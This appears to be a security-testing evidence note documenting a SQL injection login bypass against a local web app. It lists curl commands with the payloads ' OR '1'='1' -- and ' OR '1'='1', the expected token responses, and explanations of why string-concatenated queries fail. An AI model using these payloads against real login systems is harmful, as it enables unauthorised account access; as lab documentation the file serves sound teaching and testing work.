# Save this into a file for your records, e.g. evidence/sql-injection.md

## SQL Injection - Login Bypass

1. Failed normal login: screenshot1.png
`$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=wrong"`
- Should return:
`HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}`

2. Successful injected login: screenshot2
`$ curl -i -X POST http://localhost:7000/login --data-urlencode "username=' OR '1'='1' --" --data-urlencode "password=' pass"`
- Should return:
`HTTP/1.1 200 OK
{"token":"...","realtorId":1}`

  - Explanation: the login query concatenates raw input into the SQL string.
    The payload `' OR '1'='1'--` turns the rest of the clause into a comment, thus the clause is
    always true, bypassing the password check entirely.

3. Successful injected login 2: screenshot2
`$ curl -i -X POST http://localhost:7000/login --data-urlencode "username=bob" --data-urlencode "password=' OR '1'='1"`
- Should return:
  `HTTP/1.1 200 OK
  {"token":"...","realtorId":1}`
  - Explanation: the login query concatenates raw input into the SQL string.
    The 'username' is identified but the payload `' OR '1'='1` for the password changes the 'WHERE' clause to check 
    whether the password is the users correct password or '1 =1',thus the clause is
    always true, bypassing the password check entirely.